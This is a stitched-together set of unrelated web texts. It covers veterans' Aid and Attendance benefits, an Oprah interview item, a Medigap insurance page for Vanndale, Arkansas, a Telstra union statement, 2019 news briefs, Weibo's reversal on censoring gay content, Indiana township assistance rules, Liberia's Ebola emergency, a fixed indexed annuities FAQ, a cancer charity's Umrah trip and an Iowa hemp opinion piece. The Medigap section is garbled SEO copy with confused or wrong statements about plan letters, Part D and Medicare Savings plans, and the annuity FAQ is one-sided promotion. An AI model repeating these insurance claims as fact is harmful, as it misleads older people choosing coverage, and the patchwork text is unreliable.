Veterans Benefits
The Veterans Administration is probably the best kept secret in senior health care. The VA is a wonderful organization that helps veterans in many ways. Probably the two most beneficial programs for older veterans are their prescription drug program and their Aid and Attendance program.
Prescription Drug Program
To find out if you qualify for financial assistance with your medications, contact the veteran’s hospital or clinic nearest you. If you are not sure if there are any in your area, contact your county Veteran Service Office (VSO). Call us at 330-656-5580 if you need assistance.
Aid and Attendance
Aid and Attendance is a reimbursement of medical expenses for those who qualify. It pays as much as $2,230 per month for a married veteran with a dependent spouse, $1,881 for a single veteran and $1,209 for the spouse of a deceased veteran.
To qualify, the veteran needed to have served for at least 90 days of active duty, at least one day during wartime, and honorably discharged.
The applicant requires the daily assistance of someone to help with activities of daily living.
The applicant needs to satisfy the requirement that they are spending more for their care per month than their monthly income.
The applicant needs to meet certain asset requirements that vary with circumstances.
At Bill McCarthy and Associates we have advised many, many applicants on what is necessary to complete a successful application for Aid and Attendance. Call us at 330-656-5580 for a FREE assessment to see if you qualify.

Oprah recently hosted OWN’s third annual “SuperSoul Sessions” speaker series at UCLA, where inspirational leaders like Tony Robbins and Glennon Doyle Melton talked in front of the live audience about various topics of great importance in our society nowadays, including politics and Donald Trump!
Oprah sat down and held a discussion with Seat of the Soul author Gary Zukav, directing the conversation towards the status of today’s politics.
“We all know how polarized we are in the world today,” she said. “It seems like it’s just accepted, the more divided we are than ever.”
Zukav agreed, adding that the current administration is encouraging hate crimes, division, and fear.
Oprah made the observation that we may live in a world that is all about fear-based leadership and that is definitely not a good approach at governing a democratic nation.
From her point of view, the fear is just going to create more and more fear until the point where even our unalienable right to free speech is going to be stepped on unless we as people come together and fight the system together.
At this point, a voice from the audience shouts: “Oprah for president!” followed by thundering applause from the crowd.
Oprah simply smiled but said “No, thank you,” over the cheers.

The Q&A style interview went on much longer and the host and Zukav talked about many other branches of this topic, going deeper into the idea of fear existing in governance as well as the author’s idea of how “authentic power” can win against the pursuit of external power that has led to today’s violence and destruction.

Medigap Insurance in Vanndale, AR
Are you looking for the best Medigap insurance in Vanndale, AR? We can help you find affordable and quality Medicare Supplemental Insurance in Arkansas. You can either call 888-602-5343 or enter your Zip Code above and fill out the form. We will help you find the best Vanndale, AR Medigap insurance options.
Buying Medigap, or Medicare Supplemental Insurance, is the key for many people over age 65 to be able to afford to use their Medicare coverage. Medigap is a separate policy that is sold by private insurance carriers that adhere to Arkansas laws.
For the most part, Medigap covers co-insurance, co-payments, and even includes medical coverage if faced with an emergency when traveling outside of the United States. Older Medigap plans also covered deductibles, though those were mostly phased out in 2010. Medigap covers costs seen in Medicare Part A and Part B Plans. Medicare Advantage plans are also available though not in conjunction with Medigap benefits. Likewise, be aware that it is illegal to sell a Medigap holder Medicare Savings plans.
The reason people in Vanndale, AR buy Medigap is to cover where an individual’s money will fall short. Buying a Medigap policy will require monthly premiums in addition to Part A and Part B Plan premiums. Though, the fact is that there are still ways to save on Medigap coverage.
For one, apply for policies while in the first 6 months of your Medicare Part and Part B plan policies. During this period, guarantee issuance is extended to anyone over the age of 65 within the first six months. It means that there are no denials or increases in premiums because of pre-existing conditions, based upon past medical history, or current medical problems that spring up.
If an individual waits they may pay higher rates and fees for extending past the deadline. It is better to shop around and compare quotes and do so during the open enrollment period. The majority of Medigap plans are standard and demarcated by letters A through N. Each plan covers benefits but have added benefits. For instance, part D covers prescriptions.
Some plans are decommissioned already, and others are set for being phased out by 2020. Fortunately, the unavailable policies are not marketed any longer. And, if you were concerned that you are missing, know that most of the old plans are actually more expensive because the policies have fewer subscribers than today’s active plans.
That means that while cheap Medicare Supplemental Insurance plans A through G charge higher premiums, costs that are out-of-pocket are not as expensive as for Plan K through Plan N. Those carry lower premiums and like benefits but at the trade-off of costing more at the time of service.
Employer Retiree Benefits
The next way to save money beyond following the open enrollment dates is to find out if a former or present employer has a Medigap policy of its own. In general, these will be less costly than an individual policy that you buy on your own. Though, the warning and word to the wise is to carefully consider if the company is financially stable or not.
Determining Eligibility
Whenever purchasing many types of Medicare plans, you actually cancel the old policy before instating the new policy. That is not the case where Medicare A and B are concerned. The reason, recall, is that affordable Medicare Supplemental insurance is meant to fill the gaps of conventional original Medicare policies.
It requires still being covered under Medicare. The other benefit is to know when shopping around that the policies are the same whether you buy with Humana or Aetna or BlueCross BlueShield, for instance.
What is worth looking at is the reputation of the health insurance company, the quality of the coverage they offer, and the credit worthiness rating of the insurance company. The reason to look at the credit worthiness of the company offering up the insurance is to ensure that they are likely to have the money to pay out benefits and claims as agreed in the policy paperwork.
In addition to looking for insurance carriers that have an A or greater rating in the creditworthiness area, it is important to find out about the customer service and the customer satisfaction ratings of the companies you are comparing as well. It pays to have the company that pays claims within a timely manner, without a heroic effort on your part or the part of your doctors.
Otherwise, you will spend time having to contact the Arkansas insurance department or commissioner to file official complaints to get the claims paid within the acceptable two-month window. All of the Plan C Medigap coverage will be the same as that same plan from another insurer. Look at service quality and price. Look at comparing insurance company offerings to locate a cheap medicare supplement insurance plan in Vanndale, AR .
You will also need to look for separate prescription drug coverage, which is designated by Medicare Part D. This will add in an additional premium in addition to other costs. The key is that the majority of people who qualify for cheap medicare supplemental insurance are 65 and older, and look for their Medigap during open enrollment.
In addition , the other requirements stipulate Medicare Part B and Part A participants are eligible. Once you choose a cheap Medicare Supplemental insurance coverage it is as if it is written in stone and can not be altered.
To be eligible for cheap Medicare Supplemental insurance plans in Vanndale, AR apply for coverage offered by insurers within your state. All policies are available in each state, though most states will have one single policy available for Medicaid plan holders.
Everyone at age 65 and older and who is also enrolled in the Medicare Parts A and B is eligible to purchase a supplemental plan. It is advisable to decide on a plan during the 6 months of open enrollment to pay the most favorable policy premiums. When comparing costs during the open enrollment, it means pre-existing conditions are not factored into the pricing for the premiums. It is the hands-down best way to save money on a Medigap Supplemental plan in Vanndale, AR .
Always find out the Arkansas laws prior to shopping. They can vary a bit, though it is important to recall that the policies are uniform across states. Use online free quotes searches to find all of the options available to you. Narrow it down based upon credit worthiness of each of the insurers, along with their quality of care and their speed of paying out claims.

Telstra jobs purge must be stopped
CEPU & CPSU JOINT MEDIA STATEMENT
Telstra’s announcement of the largest jobs purge in Australian corporate history is unacceptable.
The destruction of 8,000 skilled white and blue collar jobs is a national jobs emergency that can not be allowed to proceed.
Cuts of this scale will severely undermine Telstra’s capacity to deliver quality services to its customers, particularly those in rural and regional communities.
It also sends a terrible message more broadly that workers in a high-tech, digital business like Telstra can be thrown on the scrap-heap so easily.
The federal government must urgently intervene in this issue to retain worker confidence in the economy and use its power as a major consumer of telecommunications services to maximise pressure to protect these jobs.

Southwest 737 Max makes emergency landing in Orlando
Mar 26, 2019
ORLANDO, Fla. — A Southwest Airlines Boeing 737 Max made a safe emergency landing Tuesday in Orlando, Florida, after experiencing an engine problem, the Federal Aviation Administration said. The crew declared an emergency after taking off from Orlando International Airport around 2:50 p.m., and returned to the airport safely. No passengers were on board, and the aircraft was being ferried to Victorville, California, where Southwest is storing the airplanes. The 737 Max was grounded in the U.S. March 13 after a deadly crash involving a Max in Ethiopia on March 10. It was the second fatal crash involving the airplane....
Apples wins 1, loses 1 in battle over iPhone technology
Mar 26, 2019
SAN FRANCISCO — A mind-bending battle over some of the technology used in iPhones became even more muddled Tuesday when a federal trade agency handed separate victories to the embittered foes, Apple and Qualcomm. On Tuesday, the U.S. International Trade Commission issued two decisions within a few hours of each other. In one, Administrative Law Judge MaryJoan McNamara recommended blocking some iPhones from being imported into the U.S. after concluding Apple's best-selling device infringed on technology owned by mobile chip maker Qualcomm. Then the full commission weighed in another case brought by Qualcomm, and overturned a ruling issued last September...
Abortion flap could cost Kansas governor her commerce chief
Mar 26, 2019
TOPEKA, Kan. — Democratic Gov. Laura Kelly could be forced to replace Kansas' top business development official because of two small grants to a nonprofit group he previously managed from a fund tied to a late physician known nationally for doing late-term abortions. Acting state Commerce Secretary David Toland has no role in regulating abortion providers, but the state's most influential anti-abortion group has joined an effort by some Republican legislators to oust him. They are troubled by grants totaling less than $20,000 to a southeast Kansas economic development group from a memorial fund named for Dr. George Tiller. Tiller...
Judge dismisses some of Levine's claims against Met Opera
Mar 26, 2019
NEW YORK — A New York judge on Tuesday dismissed portions of a lawsuit filed by former Metropolitan Opera music director James Levine against the company last year. Levine was the Met's music or artistic director from 1976-2016, then became its music director emeritus. He was fired in March 2018 after the Met said an investigation found evidence of sexual abuse and harassment. Levine sued three days later, claiming breach of contract and defamation and seeking at least $5.8 million in damages. The Met moved last July to dismiss the defamation counts. New York Supreme Court Justice Andrea Masley on...
Democrats see opening in Trump's push to quash 'Obamacare'
Mar 26, 2019
WASHINGTON — President Donald Trump is calling on Republicans to revive the effort to quash the Affordable Care Act, handing Democrats an opportunity to unite in defense of the law as they try to move past the Russia investigation and win the White House in 2020. Trump's administration is asking a federal appeals court to strike down the entire health care law. The president vowed on Tuesday to make the GOP the "party of health care" and told Senate Republicans to lean into their own agenda on the issue as they head into next year's election. The moves could help...

BEIJING — One of China's top social networking sites announced Monday that it will no longer be censoring content related to gay issues after the plan triggered a loud public outcry.
Weibo.com was flooded over the weekend with the hashtags "#I'mGay" and "#I'mGayNotaPervert" after the Twitter-like platform said that cartoons and short videos with pornographic, violent or gay subject matter would be investigated over a three-month period.
The microblogging site, which saw its Nasdaq shares fall on Friday, said in its amended post: "This clean-up of games and cartoons will no longer target gay content." A company spokesman refused to clarify how the platform would treat short videos with gay content.
The investigation will instead "primarily focus on pornographic and violent material," Weibo's statement said. "Thank you everyone for your discussions and suggestions."
The company previously said that it was acting in accordance with China's cybersecurity laws. The Cyberspace Administration of China, the country's internet regulator, did not immediately comment.
Regulators have been ratcheting up control over Chinese microblogs in recent months, ordering operators like Weibo to set up a mechanism to remove false information after criticizing it for allowing prohibited material to spread. It was the latest of new measures imposed by President Xi Jinping's government to tighten control over what China's public can see and say online while still trying to reap the economic benefits of internet use.
While homosexuality is not illegal in China and few Chinese have religious objections to it, a traditional, conservative preference for conventional marriage and childbearing creates barriers for LGBT people.
Following Weibo's initial announcement Friday, more than a million users have viewed hashtags in support of LGBT rights, with many sharing their own experiences as an LGBT person or a parent of one.
Hua Zile, the founder of "Voice for China LGBT," Weibo's first LGBT-themed account, said he was encouraged by the outrage against the site's censorship plan.
"The response shows that we LGBT people in China are slowly realizing our rights," Hua said. "Gay people who would not have spoken out years ago are now letting their voices be heard."
Hua said a Weibo manager told him to stop posting while the "cleanup" was to take place. He complied, and his announcement that Voice for China LGBT would be going on hiatus was shared nearly 40,000 times.
Now that Weibo has admitted its mistake, Hua said, it should apologize to the LGBT community.
"Like China, which has developed so quickly in such a short time, sex education in the country is a work in progress," he said.
On Sunday, an LGBT group led more than 100 people in joining a large marathon in the city of Nanjing, holding rainbow flags to raise awareness of LGBT issues. The group had planned to take part the marathon months in advance, but its organizer, Lucas Chen, said Weibo's announcement gave it "added significance."
The main objective of joining the marathon was to "help everyone courageously come out of the closet," Chen said. "So it was meaningful that people online were also bravely speaking out and showing that they were not defeated by negativity."
The People's Daily, the official paper of the ruling Communist Party, also appeared to criticize Weibo in a Sunday editorial.
"Intellectually speaking, there should be a consensus around respecting other people's sexual orientation," the column said, adding that comparing homosexuality to pornography and violence and regarding it as "abnormal sexual relations" can easily create misgivings in public opinion.
___
This story has been corrected to show that an LGBT group led more than 100 people in joining a marathon in Nanjing that drew 20,000 runners, not that an LGBT marathon drew 20,000 participants.

Township Assistance Eligibility
A. Residency Requirement (I.C. 12-20-8)
Township Public assistance applicants must physically reside in the township to which they apply (except for situations of emergency affecting applicants who are temporarily in the township for reasons other than township public assistance). It is not necessary to live in a particular township for any specific length of time. However, to be eligible for assistance, an applicant must have established a household within the township. The household must not have been established for the primary purpose of qualifying for township public assistance (I.C. 12-20-8-3). Therefore, in order to verify an applicant’s residency and their intent to live permanently in the township, the Trustee will consider the conduct of the applicant, both active and passive, as may reveal an intent to reside within a given household and within his respective township. Items which will be used to establish residency include mailing address, Indiana driver’s license, motor vehicle registration, Indiana state picture I.D., voter’s registration, telephone listing, utility billings, address given to others, change of address notices via the U.S. Postal Services; a secured lease; the location of the previous residency and how the household was supported there; the means of transportation which brought the household to this township and how it was paid; invitations or promised assistance from relatives, friends, or social service agencies; or any other documentation requested by the township. (I.C. 12-20-8-3).
Unless proven otherwise, it will be presumed that able-bodied applicants moving into the township without holding a full time job of thirty (30) hours per week or more, within one hundred eighty (180) days prior to the date of applying to the Trustee for assistance, was done in contemplation of or for the purpose of seeking and obtaining township assistance.
Unless proven otherwise, it will be presumed that able-bodied applicants moving into the township holding a HUD voucher and not ever holding a full-time job of thirty (30) hours per week or more, for more than sixty (60) days, was done in contemplation of or for the purpose of seeking and obtaining township assistance.
The definition of “household” will not be construed to mean temporary living arrangements made available by friends, relatives, acquaintances, or public or private social service agencies. Household is defined as simply an individual or as a group of people who share the same living quarters with common entrance to the housing unit, as well as a common kitchen/dining area.
A residence legally acquired continues until the legal residence is lost by acquiring a new legal residence or by willful and uninterrupted absence from the township in which legal residence has been gained.
An individual may not be considered to have lost legal residence in Indiana because of an absence that is due to business of the State or of the United States (I.C. 12-20-8-6).
Time spent in a penal institution, public or private charitable or benevolent institution, hospital, fraternal home, or in any place while serving in the armed forces of the U.S. are not counted in determining legal residence (I.C. 12-20-8-5).
Individuals in the U.S. without permission of the Immigration and Naturalization Service (INS) are ineligible to receive township assistance (I.C. 12-20-8). Aliens must be in the country legally and hold a valid Green Card issued by the INS.
In cases of emergency, the township may provide temporary assistance to applicants who are temporarily in the township unless the applicant is specifically in the township for township public assistance. (This should not be interpreted or construed to mean that individuals residing in adjoining townships may come to the larger, urban township for assistance.) The township in which they presently reside is still obligated to investigate the circumstances of the distressed person(s) and render whatever assistance is necessary. Consequently, Fairfield Township will also refer individuals in this category to the appropriate township. If a non-resident applicant or household member is a child, the parent of a child requiring the parent’s care, or is sick, aged, injured, crippled, or physically or mentally unable to work or travel, the township trustee will furnish township public assistance to the individual until the individual can be returned to the place of the individual’s legal residence (I.C. 12-20-9-2). If an applicant or household member is determined to be eligible for township public assistance and entitled to temporary emergency relief and is present in a township in which he/she does not have legal residence, the Trustee may, if he considers it advisable, place the individual temporarily in the county home, where the individual, if capable, is to be employed (I.C. 12-20-17-4).
If the Township Trustee is unable to ascertain and establish the place of legal residence of an individual requesting assistance, the Trustee will proceed to provide assistance in the same manner as other individuals are provided assistance (I.C. 12-20-8-7).
Unemancipated youths are ineligible to apply for township public assistance.
B. Evidence of Need (I.C. 12-20-5.5-6)
Once residency is established, the Trustee will relieve and support the individual, if the individual is eligible and in need. Households requesting township public assistance must show financial need. Any monetary amount paid to an applicant or a member of an applicant’s household for the thirty (30) days before the date of application for township public assistance, or accrued and legally available for withdrawal by an applicant or a member of an applicant’s household at the time of application or for up to thirty (30) days after the date of application for township public assistance will generally be used in calculating a household’s financial need. When the applicant’s or household member’s countable income has ceased or been reduced, the Trustee will determine eligibility by using any remaining unspent income and the expected income for the next thirty (30) days. Applicant households are required to report any “one time” monetary benefits, awards, or settlements received within ninety (90) days immediately preceding application for township public assistance (I.C. 12-20-6-1, I.C. 12-7-2-44.7).
Countable income includes, but is not limited to, the following:
Gross wages before tax deductions.
Social Security benefits, including Supplemental Security Income.
Temporary Assistance to Needy Families (TANF).
Unemployment compensation.
Worker’s compensation (except that which is restricted for the payment of medical expenses).
Vacation pay.
Sick benefits.
Strike benefits.
Private or public pensions.
Taxable income from self-employment.
Bartered goods and services provided by another individual for the payment of nonessential needs on behalf of an applicant or an applicant’s household, if monetary compensation or the provision of basic necessities would have been reasonably available from that individual.
Child support, GAP support, or alimony.
Gifts of cash, goods, or services.
Severance pay.
State and federal income tax refunds.
Interest on bank accounts, stocks, bonds, certificates of deposit, or similar assets.
Educational grants or loans for secondary or higher education at an approved institution of higher learning, to the extent that they are used for basic living expenses.
Disability payment from any source.
The monetary value of subsidized housing, utility, or child care (provided by another governmental agency).
Other sources of revenue that the trustee may reasonably determine to be countable income, including “one time” monetary benefits, awards or settlements received within the ninety (90) days immediately preceding the application for township public assistance. One time monetary awards may include, but are not limited to the following: energy assistance payments, retroactive Social Security payments, workman’s compensation, inheritances, pensions, insurance settlements, and federal and state income tax returns. Any of these monies received will undergo evaluation the same as the 30 days prior income.
Note: The following sources of income will be exempt from countable income in calculating eligibility for township public assistance: The monetary value of food stamp assistance and educational grants and loans for secondary or higher education at an approved institution of higher learning or for a job training program, to the extent they are used for tuition, books, fees, supplies, child care, uniforms, and transportation among other expenses provided for in connection with the education.
Households requesting assistance will be required to report all assets belonging to any household members. Upon request of the Township Trustee, a person holding assets or title to assets of a township public assistance applicant or household member will provide the Trustee with information concerning the nature and value of those assets for purposes of determining the household’s financial eligibility to receive township public assistance. Assets (non-basic or non-essential) which may affect eligibility are those which are available to the household, but are not considered necessary for the health, safety, or decent living standard of a household; and are owned wholly or in part by members of the household; and those (assets) that the member has the legal right to sell or liquidate; and that include all real property other than that used for the production of income or is the primary residence of the applicant.
Countable assets which may affect an applicant’s eligibility for township public assistance may include, but are not necessarily limited to the following:
(I.C. 12-7-2-44.6, I.C. 12-20-7-3.5).
Motorcycles or similar modes of transportation
Boats, boat motors, or boat trailers
VCR’s, cam recorders
Microwaves
Guns or hunting equipment
Camping trailers, recreation vehicles
Jewelry
Non-basic telephone services (caller I.D., call waiting & forwarding, etc.) and accessories (including answering machines and cellular phones)
Cable television service and satellite dishes or service
More than one automobile or an expensive automobile make/model
Any other item of value which the trustee may determine to be a non-essential asset
All liquid assets such as bank accounts, stocks, bonds, 401K plans, retirement plans certificates of deposit, non-basic telephone service, television cable service of any kind, leasing of non-essential household items, etc. must be liquidated immediately and any proceeds used for current basic needs. This may be verified before any assistance will be granted.
All members of the household will be expected to liquidate any non-essential assets (i.e., recreational equipment, boats, motors, camping trailers, guns, other hunting equipment, motorcycles, CAM recorders, VCRs, jewelry, etc.) as soon as possible, but no longer than thirty (30) days from the date the initial application is filed. The township highly recommends, or may even insist, the termination of any and all credit cards.
Assets considered exempt from liquidation include one house or mobile home in which the household resides and one automobile, which the value or equity does not preclude the household from qualifying for state or federal assistance programs, or other property that produces income.
The trustee has set income standards consistent with the reasonable cost of basic necessities in his particular township and these are used to define financial eligibility (I.C. 12-20-5.5-6). Basic necessities include those items or services essential to meet the minimum standards of health, safety, and decency and include the following:
Shelter.
Essential utility services (see definition on page 11).
Food.
Medical care (described in I.C. 12-20-16-2).
Clothing and footwear.
Household essentials (see definition on page 6).
Transportation to seek and accept employment (on a reasonable basis).
Other services or items the Township Trustee determines are necessities (I.C. 12-7-2-20.5).
(See pages 4 to 12 for the definitions of all basic necessities).
As part of the application process, applicants are required to provide a listing of all income expended in the last thirty (30) days. Only expenditures for basic necessities will be recognized as legitimate (i.e., expended income). Expenditures for items other than basic necessities will be considered the same as unexpended income. Applicants and household members will be required to provide current receipts for all expended funds to verify how income was spent.
Only receipts and expenditures for basic necessities will be recognized (I.C. 12-7-2-200.5). An automobile and auto related expenditures (repairs), cable television service, non- basic telephone services, telephone accessories, court costs and related expenses due to criminal behavior are included in, but is not limited to, items considered non- basic or non-essential. Therefore, expenditures for these items are not recognized as legitimate expenses or justifiable expenditures and will be subtracted from the township income eligibility standards listed below. The difference will be the maximum total township assistance payable on behalf of the household.
It will be presumed that the spending of income for non-essential items within thirty (30) days of the date of applying to the Trustee for assistance was done in contemplation of or for the purpose of seeking and obtaining township assistance.
In cases where the household had been able to afford a non-basic item and a sudden loss of income due to no willful negligent act of the applicant or household member occurs, then that amount will not be subtracted from the amount of eligibility. If the maximum township public assistance payable is greater than the actual amount of the household’s unmet basic need, the amount payable will be the amount for the unmet basic need.
Applicants for all township public assistance, who are otherwise eligible, will only be eligible if the Gross household income for the thirty (30) days prior to application is less than the following standards (based on the number of persons living in the household):
Household Size
Gross Income
1 $1,518
2 $2,058
3 $2,598
4 $3,138
5 $3,678
6 $4,218
7 $4,758
8 $5,298
(Each additional member add $540)
Deductions allowed: (1) medical costs for elderly (60 and older) and/or disabled household members: (2) documented court ordered child support payments: and 3) 50% of documented dependent care. The monthly income of seasonably employed individuals (construction workers, bus drivers, etc.) will be determined by dividing the total income for the prior twelve (12) months by twelve (12) (I.C. 12-20-5.5, I.C. 12-7-2-44.7).

I don�t intend extending State of Emergency �Prez. Sirleaf
By Victor Kezelee/Benjamin S. Taingay
Liberian President, Ellen Johnson-Sirleaf
(elbcradio.com/Liberia/Nov.14,2014)-President Ellen Johnson-Sirleaf says, she has no intention to extend the State of Emergency.
President Johnson-Sirleaf also announced that the curfew has been extended to mid night.
In a nation-wide address in Monrovia Thursday, November 13, 2014, she, however, clarified that the restriction will remain enforced in hot spots.
The Liberian Leader said: “I have communicated with the National Legislature on my decision.”
“My action is based on the significant progress made so far by Liberians and international partners in the fight against the Ebola virus,” the President also said.
President Johnson-Sirleaf acknowledged that the outbreak of the virus greatly undermined Liberia’s economy, but noted: “Liberians have been very cooperative with health measures.”
The Liberian leader said since the Ebola virus outbreak in March of this year (2014), the Government was successful in taking swift measures to protect its citizenry.
She named the closing of Liberia’s boarders and schools, placing restriction on public gatherings, appealing for partners’ interventions, and quarantining areas highly affected by the virus as some of the measures set up to fight the disease.
“The Public Health Law will now be enforced through awareness in communities until Liberia reaches a zero level of Ebola,” President Sirleaf further told the nation.
Commenting on the re-opening of schools, president Sirleaf said: “Upon the passage of the National budget, school authorities will begin preparing for resumption of classes, pending further instruction from health authorities.
It can be recalled that President Johnson-Sirleaf declared the State of Emergency August 11, 2014, to enable the Government implement measures to eradicate Ebola from Liberia.
The President had announced in a similar nation-wide address that the unprecedented outbreak of the pandemic in the country gave rise to the declaration of the State of Emergency across the nation.
The 90-day State of Emergency has, however, expired since November 11, amidst diverse public opinions whether to or not to extend same.
Citing the Liberian Constitution, Chapter 9, Article 86 ‘A’ and ‘B,’: “The President may, in consultation with the Speaker of the House of Representatives and the President Pro Tempore of the Senate, proclaim and declare the existence of a State of Emergency in the Republic or any part thereof.”
“Acting pursuant thereto, the President may suspend or affect certain rights, freedoms and guarantees contained in this Constitution and exercise such other emergency powers as may be necessary and appropriate to take care of the emergency, subject, however, to the limitations contained in this Chapter.”
“A State of Emergency may be declared only where there is a threat or outbreak of war or where there is civil unrest affecting the existence, security or well-being of the Republic amounting to a clear and present danger.”

Fixed Indexed Annuities FAQ
Discover our most frequently asked questions about fixed indexed annuities (FIAs). Get the answers you need to help calculate your path to retirement.
What is an annuity?
In the most basic sense, an annuity is a contract between you and an insurance company that says you will pay for the annuity in either a single lump sum or multiple payments over time. In return, the insurance company promises to make payments from the annuity to you in a single or series of payments.
What is an FIA?
An FIA is a contract between you and an insurance company where the potential interest earned is linked to an external equity index. FIAs can provide a steady, guaranteed income stream.
What does “fixed” mean?
Fixed annuities, unlike variable annuities, offer a guaranteed minimum rate of return. You are paid a guaranteed fixed amount that doesn’t vary, regardless of market swing. The insurance company assumes the risk.
What does “indexed” mean?
The index, such as the S&P 500 or the Dow Jones, is used as a benchmark to credit interest. However, you do not actually invest in the stock market, offering protection against market volatility.
What makes an FIA different?
FIAs offer the opportunity for growth and a steady, guaranteed lifetime income stream, while protecting the principal from the uncertainty of market volatility. These benefits can help you moderate risk and reward, as you plan your financial future.
How is an FIA different from a variable annuity?
FIAs guarantee a fixed rate of return, regardless of market swing; whereas the rate of return for variable annuities depend on the stock, bond, or money market investment. The insurance company assumes the risk for FIAs and the consumer assumes the risk with variable annuities.
How does an FIA add balance to a retirement portfolio?
Diversifying your portfolio means balancing risk and growth. In fact, only one in four Americans understand that FIAs can add balance to your portfolio. That means protecting some of your money from the steep downsides of a volatile stock market. Of course, you can find risk protection in CDs, savings accounts, and the like. But, at current interest rates, your money won’t have much chance to grow. With FIA products, your principal can never decline from market loss, but it can grow with a rising index. And because they are insurance products, indexed annuities can offer a guaranteed income for your lifetime.
How does an FIA respond to the stock market?
An FIA uses a unique formula to calculate annual interest based on the performance of a stock, bond or commodity index. The index is used as a benchmark; however, you do not actually invest in it, offering balance and protection against the ups and downs in the market.
What are the potential earnings associated with an FIA?
Your interest earnings rate always remains somewhere between the interest rate floor and the cap. Earnings won’t rise above the cap, even if the index goes higher. Earnings never fall below zero, even if the index goes way down.
What are some of the reasons people choose an FIA?
Half of Americans say the number one thing they will miss in retirement is a steady paycheck. FIAs can provide a steady, guaranteed lifetime income stream. Additionally, FIAs provide balance and help you moderate risk in your financial plan. Different FIAs have different methods for helping the insurance company manage the risk, including participation rates and a spread or fee. While these methods can limit your earnings, they also help ensure earnings never fall below zero.
Is Social Security the only consistent source of income in retirement?
No, FIAs can provide a steady, guaranteed lifetime income stream.

FOCP and Islamic Affairs and Charitable Activities in Dubai Take 28 Cancer Patients to Umrah
Share
United Arab Emirates, May 12, 2018: Friends of Cancer Patients (FOCP) UAE, in collaboration with the Islamic Affairs and Charitable Activities Department in Dubai (IACAD), organised an Umrah trip for 28 cancer patients and four FOCP supervisors, to show them moral support while enabling them to perform Umrah rituals which helps to alleviate their sufferings and overcome the obstacles they face along their journey of treatment with hope and spiritual guidance.
The initiative stems from FOCP's belief in the power of psychological and spiritual support for cancer patients – a move consistent with their multi-pronged approach to patient treatment, which seeks to inspire confidence in them and truly believe in their potential for a full recovery.
In a gesture to enhance institutional cooperation to further community service initiatives as part of fulfilling their corporate social responsibility IACAD covered all costs of the trip.
FOCP made all the arrangements and facilitated the medical and wellness procedures for all patients.
The organization received required travel documents, coordinated with officials in charge of the Umrah campaign, and facilitated the issuance of special cards for visiting cancer patients.
Upon their arrival in Mecca, the group was under careful supervision of an assistant group of escorts who followed up on all their requirements and needs throughout the days of the Umrah.
FOCP also dispatched its team to oversee the trip and provide the needed services to the pilgrims.
The team included Horia Ahmed, Patient Affairs Senior Executive; Hamid Al Hamid Community Affairs Executive; Badr Al Juaidi, Events and Logistics Senior
Executive; and nurse Dina Abdul Salam Salem.
Amel Al Maazmi, Beneficiary Support & Community Affairs Manager at FOCP, said: “We, at FOCP, work relentlessly to prevent patients from losing confidence because the patients' trust in themselves, their treating doctors and their families is an essential aspect of their recovery.
therefore, we strive to offer them the best possible psychological support too.”
She added: “We sincerely hope that in this spiritual journey of performing Umrah rituals will yield great results, giving patients solemn time – we hope each patient's self- confidence and faith in themselves and their positivity have received a great boost through this trip.”
Praising the initiative, Al Maazmi said: “It is not uncommon to see our national institutions take the initiative to provide aid and assistance to anyone in need.
The initiative by the Islamic Affairs and Charitable Activities Department reflects interdependence and cohesion deeply-rooted in the Emirati society.
As we highly appreciate this initiative, we are confident it will cement ties of joint action that brings together official institutions and civil society organisations to support humanitarian work.”
Afaf Afiffi Al Sayyed, a breast cancer survivor expressed extreme happiness about being given the opportunity to make an Umrah visit.
She said: “Visiting the Kaaba and performing Umrah has always been my dream, which has become a reality thanks to Friends of Cancer Patients and the Islamic Affairs and Charitable Activities Department in Dubai.
This was one of the most memorable experiences of my life.”
Afiffi added: “The kind of psychological boost I have received after visiting one of the most holy lands for those who practice Islam is second to none.
There are no words to express the blessed feeling and comfort people enjoy due to the sanctity of the place.”
She thanked FOCP for sending a special team that escorted them while performing Umrah and the great efforts they made to secure all the needs of pilgrims who felt comfortable and happy at all times, which reflected very positively on the visiting patients.
Founded in 1999, the Friends of Cancer Patients (FOCP) aims to promote community awareness about the six early detectable cancers; breast cancer, cervical cancer, prostate cancer, skin cancer, testicular cancer and colon cancer. Besides its awareness activities, FOCP provides moral and financial support for thousands of patients and their families regardless of nationality and age.
It has so far provided support for many of cancer patients, including children, women and men in the UAE.
Islamic Affairs and Charitable Activities in Dubai (IACAD) was founded on the twentieth of October 1969 by a decree issued by the late Sheikh Rashid bin Saeed Al Maktoum to establish the Department of Awqaf, which is responsible of spreading Islamic knowledge and culture, raise religious awareness across the community; and review and print the Holy Qur'an, religious publications and multimedia, and license their distribution.
The functions of the department include also establishing, licensing, supervising, and managing Holy Qur'an Memorization Centers; taking care of mosques and supervising them; licensing charitable associations and Islamic institutions and supervising their administrative, financial, and cultural affairs as well as approving their curricula; and regulating and supervising the affairs of Fatwa and issuing them.

The Significance Of The Hemp Industry To Iowa Farmers
The Iowa Senate just passed a hemp farming bill for Iowa farmers unanimously. While it’s doubtful the Iowa House will take the bill up without popular support and pressure from the public, the educational opportunities for how low THC hemp products can provide pain relief for Iowa’s farmers abound…while also increasing their profit margins and restoring their soil nutrients.
In order to understand how important hemp is to Iowa you have to understand that hemp was one of Iowa’s top crops during World War II.
The US government used to require Iowa farmers to grow hemp, and if they refused they had to pay a fine. Under Linda Upmeyer’s tutelage our history in Iowa has fallen by the wayside regarding hemp, and as future articles will outline.
http://globegazette.com/news/local/legislative-leader-upmeyer-s-son-arrested-in-creston/article_104ae196-c543-11e1-b0de-001a4bcf887a.html
For now, representatives like Upmeyer avoid rational science based drug policy to avoid embarrassment over passed decisions. Please write Linda Upmeyer as well as your Iowa House representatives and encourage them to allow the hemp bill from the Senate to be brought to the House floor for debate. While you’re at it, tell them to research what hemp is. It would have been nice if the House had worked on this and sent it over to the Senate, but the two wings don’t always work well together. Linda Upmeyer’s fear is a big part of the House’s resistance to rational, compassionate, science based programs, and this fear has lead them to make a program so terrible, nobody wants to partake in it.
While hemp CBD may be illegal at the federal level – a lawsuit challenging this assertion is due for a ruling here soon against the DEA — hemp products are still legal at the state level. So while you can still buy legal hemp products at roughly 10,000 stores throughout Iowa, Iowa farmers cannot reap the tremendous profit windfalls that come from growing it until Upmeyer’s scandal riddled legislature decides that they will grant extremely limited permission from on “high” to Iowans to be healthier and more productive agriculturally while the rest of the nation skips ahead and lets farmers discuss this openly to resolve some current agricultural issues throughout the industry.
